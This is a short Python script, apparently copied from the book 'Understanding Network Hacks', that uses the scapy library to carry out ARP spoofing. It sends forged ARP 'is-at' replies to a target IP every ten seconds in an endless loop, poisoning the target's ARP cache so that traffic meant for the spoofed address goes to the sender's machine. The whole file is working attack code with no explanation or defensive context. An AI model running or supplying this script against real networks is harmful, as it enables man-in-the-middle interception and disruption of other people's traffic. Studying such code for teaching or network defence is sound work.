#!/usr/bin/python
# from Understanding Network Hacks

import sys
import time
from scapy.all import sendp, ARP, Ether

if len(sys.argv) < 3:
    print(sys.argv[0] + ": <target> <spoof_ip>")
    sys.exit(1)

iface = "ens33"
target_ip = sys.argv[1]
fake_ip = sys.argv[2]

ethernet = Ether()

arp = ARP(pdst=target_ip,
          psrc=fake_ip,
          op='is-at')

packet = ethernet / arp

while True:
    sendp(packet, iface=iface)
    time.sleep(10)
